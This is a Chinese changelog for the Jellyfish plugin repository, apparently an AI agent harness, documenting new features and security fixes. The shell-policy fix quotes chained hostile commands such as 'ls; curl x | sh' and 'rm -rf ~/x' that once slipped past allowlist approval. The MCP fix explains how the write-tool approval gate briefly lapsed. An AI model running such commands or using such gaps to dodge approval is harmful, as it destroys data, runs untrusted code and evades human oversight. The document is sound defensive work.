# 变更日志

本文件记录 Jellyfish 官方插件仓库所有值得使用者知道的变更。

格式遵循 [Keep a Changelog](https://keepachangelog.com/zh-CN/1.1.0/)，
版本号遵循[语义化版本](https://semver.org/lang/zh-CN/)。

## [Unreleased]

### Added

- `jellyfish-plugin-project` 新增 `/init [--force]` 命令：让模型读一遍仓库后写出 `AGENTS.md`。
  命令自己不写盘，只把一份指令交给内核（「命令接力」，见内核 `README.md` 的同名小节），
  由模型走工具写入——因此写入照旧过权限与审批链。工作目录里已有非空 `AGENTS.md` 时默认拒绝，
  带 `--force` 才接力，并在指令里要求「先读现有文件、增量更新而不是重写」。

### Changed

- **`jellyfish-plugin-shell` 的命令判定改为「按段」**（安全修复）：执行侧是 `/bin/sh -c 原文`，
  而判定只比对原文前 1~2 个 token，于是 `ls; curl x | sh`、`git status && rm -rf ~/x` 这类命令的
  第一个 token 命中只读表/白名单就被整串免审批执行——白名单与只读表这两个被当作约束的机制同时失效。
  现在先按未引用状态下的 `;`、`|`、`&` 与换行切段，**每段各自过白名单、可信表与只读表并取最严结果**；
  可信表要求**全段命中**（`trustedCommands: ["mvn test"]` 不再顺带放行 `mvn test; rm -rf x`）；
  命令替换与重定向（如 `echo evil > ~/.bashrc`）**升级为人工审批**，因为前缀匹配看不见后半段的动作。
  引号内的分隔符与重定向仍是字面量；引号未闭合时不给结论、一律问人。
  `git branch`、`git remote` 移出内置只读表——它们有 `-D` / `remove` 这类改写子命令，
  与 `find`、`git fetch` 同属误判点。**配了 `allowedCommands` 或 `trustedCommands` 的用法需要复核一遍**：
  含管道、重定向或复合命令的调用现在会走向审批（无人值守下即拒绝）。
- Maven 坐标由 `zcd` 改为 `io.github.zcd0831`，版本号统一到 0.1.1（含各插件描述符里的 `plugin.version`）；
  插件依赖的内核契约改为 `io.github.zcd0831:jellyfish-api`，与内核 0.1.1 配套。
- 官方插件仍不发布到 Maven Central（它们是 PF4J 插件包，按 `cpPlugins.sh` 装到内核的插件目录）。
- `jellyfish-plugin-project`：**「没有约定文件」不再进会话缓存**。原来一个会话只读一次盘，
  于是会话中途新建的 `AGENTS.md` 在本会话里永远看不见——那正好抵消了 `/init` 的意义。
  现在空贡献每轮重探一次（只多一次 `stat`，不读内容）；**已经读到过的内容仍按会话缓存一次**，
  「会话中途修改 `AGENTS.md` 要开新会话才生效」这条不变。

### Fixed

- **`jellyfish-plugin-mcp`：只读标记与工具注册同生同死**（安全修复）。一次 `tools/list` 就是一次整体替换，
  而原来的顺序是「先按名字删旧标记 → 注册新工具 → 最后装新标记」：中间那一段里工具在扩展点上可调用、
  标记表里却没有它，权限处理器据此认为「这不是我的工具」而无异议——`askWriteTools` 那道闸门在每次
  刷新（含 server 自己发 `notifications/tools/list_changed` 触发的重扫）都会短暂消失。
  现在按 server 存整份标记视图、一条 `put` 原子替换，并把顺序改成「关旧处理器 → 装标记 → 注册 → 摘掉
  没注册成的名字」：任何时刻「能调用的名字」都已经带着标记；代价是注定注册不上的名字（与内置工具撞车）
  在刷新期也带着标记，方向偏严。同时修掉两处连带的错判：注册失败的名字不再留在标记表里
  （此前它会让被撞的**内置工具**被判成「MCP 未声明只读」，`-cli` / `-server` 下 ASK 即拒绝，
  内置工具直接不可用）；两个 server 提供同名工具时，替换其中一个不再抹掉另一个的标记
  （同名互相矛盾时按最严算：任一边算写类就要审批）。
- `jellyfish-script`：桥接插件 `stop()` 从不关闭事件桥（`ScriptEventBridge.close()` 全仓无调用点），
  而推送线程的循环条件是 `!closed || !queue.isEmpty()` 且阻塞在 `queue.take()` 上——`closed` 永远为
  `false`，于是每次停止（含 `/reload` 重启插件）都留下一条常驻线程与一整份对象图（网关、队列、
  `PluginContext` 被强引用）。现在 `stop()` 会关闭事件桥，并排在 `gateway.close()` 之前
  （事件桥唯一的出口就是网关）。同时给 `close()` 的 `join` 补了超时告警。

## [0.1.0] - 2026-10-07

### Added

- `jellyfish-plugin-tools`：五个文件工具（`read_file`、`write_file`、`edit_file`、`list_dir`、
  `grep_files`）、提问工具 `ask_user`，以及输入框的 `@` 文件引用。
- `jellyfish-plugin-shell`：`shell` 工具（`/bin/sh -c` 执行命令原文）+ 命令策略（白名单准入、可信表免审批、
  只读不打扰、灾难形状拒绝、其余走审批，执行时剔除环境变量中的敏感项）+ `!命令` 输入指令。**没有沙箱**。
- `jellyfish-plugin-session-file`：会话持久化，一个会话一个 JSON 文件并用 git 管理历史。
- `jellyfish-plugin-todo`：`todo_write` / `todo_claim` / `todo_done` / `todo_release` / `todo_block`
  五个工具、只读 `/todo`、随本轮消息送达的待办块（不占 system prompt）、状态栏进度与左栏清单面板。
- `jellyfish-plugin-project`：探测工作目录下的 `AGENTS.md`，小文件内联原文、大文件只给路径（阈值可配）。
- `jellyfish-plugin-compact`：会话压缩策略（摘要指令 + 保留条数 / 摘要上限）。**不装它就没有压缩**。
- `jellyfish-plugin-skills`：按目录发现 `SKILL.md`，元信息常驻 system prompt，正文由 `skill` 工具按需加载。
- `jellyfish-plugin-mcp`：MCP 客户端，stdio 连外部 server，把它的工具以 `mcp__<server>__<tool>` 接入。
- `jellyfish-plugin-workflow`：`workflow` 工具接受一份声明式 spec，按依赖并发派生子代理并聚合结果。
- `jellyfish-plugin-plan`：plan 模式，`/plan [on|off]` 在会话内开关，开启时只有白名单里的工具可用。
- `jellyfish-plugin-resmon`：JVM 与 `~/.jellyfish` 占用采样（磁盘按 `baseDir` 一级子项统计），
  只读 `/resmon [jvm|disk|auto]` 命令与右栏常驻面板。**只报告、不清理**。
- `jellyfish-plugin-python` / `jellyfish-plugin-node`：把 `scripts/<语言>/<id>/` 下的脚本目录变成标准插件，
  两条路径同构、共用同一套协议与进程模型；`jellyfish-script` 是它们共用的机制层库，
  新增一门语言只要一个薄子类（`resolveConfig` + `createLanguage`）。
- 脚本插件的运行期能力：能力档分派、逐脚本配置、周期任务（`schedules`）、事件桥接（白名单 + 标量投影）、
  熔断状态机与超时隔离链、取消令牌中止在途调用、网关 PID 文件与陈旧 PID 报告、
  工具结果元数据与调用者身份下发、Node 侧 async handler。
- `examples/scripts` 下的示例脚本：`web`（联网搜索与网页抓取，默认走 Exa 公开端点，出网地址用
  `allowRanges` 限定）与 `stock`（A 股行情与自选股，会话内命令）。
- 插件开发教程（见 `README.md`）：最小骨架、`pom.xml`、扩展点选型、读自己的配置、往外壳推内容、
  打包安装与内核升级后要跑的检查。
- 命令策略的 `commandPolicy.trustedCommands`：白名单内的命令免审批直接执行。
- 插件 id 与模块名一致（`jellyfish-plugin-<模块名>`），`plugin.requires` 声明内核兼容约束。

[Unreleased]: https://github.com/zcd0831/Jellyfish-Plugins/compare/v0.1.0...HEAD
[0.1.0]: https://github.com/zcd0831/Jellyfish-Plugins/releases/tag/v0.1.0
